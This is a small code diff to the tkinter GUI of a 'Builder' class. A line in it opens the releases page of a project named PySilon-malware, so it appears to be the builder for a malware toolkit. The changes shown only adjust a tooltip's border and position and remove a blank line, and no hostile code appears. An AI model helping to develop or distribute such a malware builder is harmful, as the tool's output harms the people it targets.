@@ -241,7 +241,6 @@ class Builder:
                 builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['font_size']), 
             anchor=tk.NE)
         
-
     def exit_program(self):
         size_y = 520
         size_x = 700
@@ -456,9 +455,9 @@ class Builder:
         os.system('start https://github.com/mategol/PySilon-malware/releases')
     
     def show_tooltip(self, event, tooltip_text):
-        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=2, background="#0A0A10")
+        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=0, background="#0A0A10")
         self.tooltip_label.place(
-            x=0, 
+            x=10, 
             y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['pos_y'], 
             anchor=tk.SW)
 
